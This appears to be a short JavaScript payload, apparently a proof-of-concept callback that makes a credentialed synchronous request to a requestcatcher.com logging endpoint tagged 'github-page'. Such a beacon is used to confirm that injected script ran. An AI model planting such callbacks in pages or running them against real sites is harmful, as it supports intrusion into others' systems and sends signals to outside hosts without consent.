const WEBHOOK = "https://totototo.requestcatcher.com/github-page";

let req = new XMLHttpRequest();
req.open("GET", WEBHOOK, false);
req.withCredentials = true;
req.send(null);
